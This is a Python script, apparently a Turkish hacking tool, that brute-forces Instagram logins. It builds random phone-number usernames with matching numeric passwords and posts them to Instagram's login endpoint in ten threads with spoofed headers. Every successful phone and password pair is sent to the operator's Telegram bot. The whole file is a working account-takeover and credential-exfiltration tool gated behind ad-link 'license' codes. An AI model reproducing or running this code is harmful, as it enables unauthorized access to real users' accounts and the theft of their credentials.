import os
import requests
from user_agent import *
import random,uuid,time,secrets
from uuid import uuid4
import sys
import threading
os.system("clear")
kirmizi="\033[1;31m"
yeşil="\033[1;32m"
beyaz="\033[0m"

linkler=("https://ay.live/QKvWEK","https://ay.live/yjas","https://ay.live/fdx530","https://ay.live/Edey")
link = str(''.join((random.choice(linkler) for i in range(1))))
if link == "https://ay.live/Edey":
    lisans="KarderBoşŞeydir"
if link == "https://ay.live/fdx530":
    lisans="YallahBismillah"
if link == "https://ay.live/WUSC4":
    lisans="CodedYusiqo"
if link == "https://ay.live/yjas":
    lisans="MüqTool"
if link == "https://ay.live/QKvWEK":
    lisans="ZetTekno Kraldır"
def clear():
    os.system("clear")
def banner():
    print("""\033[1;31;40m
    _______________________________________

              ______________
        ,===:'.,            `-._
             `:.`---.__         `-._
            `:.     `--.         `.
                 \.        `.         `.
         (,,(,    \.         `.   ____,-`.,
      (,'     `/   \.   ,--.___`.'
  ,  ,'  ,--.  `,   \.;'         `
   `{D, {    \  :    \;
     V,,'    /  /    //
     j;;    /  ,' ,-//.    ,---.      ,
     \;'   /  ,' /  _  \  /  _  \   ,'/
           \   `'  / \  `'  / \  `.' /
            `.___,'   `.__,'   `.__,'

    _______________________________________
    \033[0m """)
    figlt=("""
    Coded By: @Yusiqo
    Channel: @ZetTekno
    Kader Sadece Bahanedir.....
    """)
    for warrior in figlt.splitlines():
        time.sleep(0.5)
        print(warrior)
    print("\033[1;31;40m    _______________________________________\033[0m")
    print("""
    """)
def startss():
    os.system("clear")
    banner()
    myadmin=input("\033[0;33mTelegram ID Gir: \033[0m")
    tele=input("\033[0;33mToken Gir: \033[0m")
    th=input("\033[0;33mBot Sayı seç (1-10 Arası) : \033[0m")
    ms="Başladı ⚠️"
    th= requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")
    toplam=0
    hit=0
    olu=0
    clear()
    banner()
    def chk():
        toplam=0
        olu=0
        hit=0
        while True:
            N = "09876543221"
            R = ''.join(random.choice(N)for t in range(7))
            user = '98913'+R
            pasw = R
            url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {
                'accept':'*/*',
                'accept-language':'en-US,en;q=0.9',
                'content-length':'378',
                'content-type':'application/x-www-form-urlencoded',
                'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
                'origin':'https://www.instagram.com',
                'referer':'https://www.instagram.com/',
                'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                'sec-ch-ua-mobile':'?0',
                'x-asbd-id':'198387',
                'user-agent': generate_user_agent(),
                'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
                'x-ig-app-id':'936619743392459',
                'x-ig-www-claim':'0',
                'x-instagram-ajax':'3bcc4d0b0733',
                'x-requested-with':'XMLHttpRequest',}
            data = {
                'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(pasw),
                'username':user,}
            req_login = requests.post(url,headers=headers,data=data)
            req= req_login.text
            if 'userId' in req:
                hit += 1
                ms = f"""
                𖣘  Made By ZetTekno Team
                ═───────◇───────═
                ❶➾ Phone : {user}
                ❸➾ Pasw : {pasw}
                ═───────◇───────═
                ⊱ Sadece ZetTekno Üyeleri İçin ⊰
                """
                requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")
            else:
                sys.stdout.write("\033[F")
                toplam += 10
                olu += 1
                toplamms=f"""
    ⛔ <Zet Tekno Tool> ⛔
                
    Ölü: {olu}
    Hit: {hit}
    
    Kod: {req}
    
    ☯️ Coded By @Yusiqo ☯️
                """
                print(f"🔥 "+kirmizi+f"Ölü: {olu} Hit: {hit}"+yeşil+f" Numara: {user} 🔥")
                print(req)
                sys.stdout.write("\033[K")
    t1 = threading.Thread(target=chk)
    t2 = threading.Thread(target=chk)
    t3 = threading.Thread(target=chk)
    t4 = threading.Thread(target=chk)
    t5 = threading.Thread(target=chk)
    t6 = threading.Thread(target=chk)
    t7 = threading.Thread(target=chk)
    t8 = threading.Thread(target=chk)
    t9 = threading.Thread(target=chk)
    t10 = threading.Thread(target=chk)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    
try:
    f = open("key","r")
except:
    f = open("key","w")
f = open("key","r")
anahtar=(f.read())
if anahtar == "Lisans= Active":
    startss()
else:
    clear()
    banner()
    keys= link
    print(f"Lisans Linki: {keys}")
    keyim=input("Giriş Kodunu Giriniz : ")
    if keyim == lisans:
        f = open("key", "w")
        f.write("Lisans= Active")
        f.close()
        startss()
    else:
        clear()
        print("Lisans Kodu Yanlış")
        quit()
